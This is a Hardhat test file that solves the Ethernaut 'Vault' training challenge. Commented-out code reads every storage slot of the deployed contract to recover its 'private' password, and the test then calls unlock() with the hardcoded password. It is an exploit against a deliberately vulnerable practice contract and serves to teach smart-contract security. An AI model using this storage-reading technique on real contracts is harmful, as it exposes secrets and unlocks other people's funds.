import { expect } from "chai";
import { BigNumber, Contract, ContractFactory, providers, Signer } from "ethers";
import { ethers } from "hardhat";
import { solveChallenge } from "../scripts/ethernaut";

describe("Vault", function () {
    let signer: Signer;
    let myAddress: string;
    let challenge_instance_address = "0xFf113b7F088afD73f5Ca3683f895F9Abc7C12e05";
    let challengeFactory: ContractFactory;
    let challenge: Contract;

    before(async () => {
        [signer] = await ethers.getSigners();
        myAddress = await signer.getAddress();
        console.log("Primary Signer Address:", myAddress);
        challengeFactory = await ethers.getContractFactory("Vault");
        challenge = challengeFactory.attach(challenge_instance_address);
    });

    it("Should solve the challenge", async () => {

        // This will give you the entirety of the storage of the contract index by index. The password can be found on the second index of the storage.
        // for(let i = 0; true; i++) {
        //  let s = await signer.provider?.getStorageAt(challenge.address, i);
        //  console.log(s.toString());
        // }

        // We can unlock the vault now:
        const password = "0x412076657279207374726f6e67207365637265742070617373776f7264203a29";
        const unlockTx = await challenge.unlock(password);
        const receipt = await unlockTx.wait();
        const isUnlocked = !!(await challenge.locked());
        expect(isUnlocked).to.equal(false);
    });

    // after(async () => {
    //     const solved = await solveChallenge(challenge.address);
    //     expect(solved).to.equal(true);
    // })
});
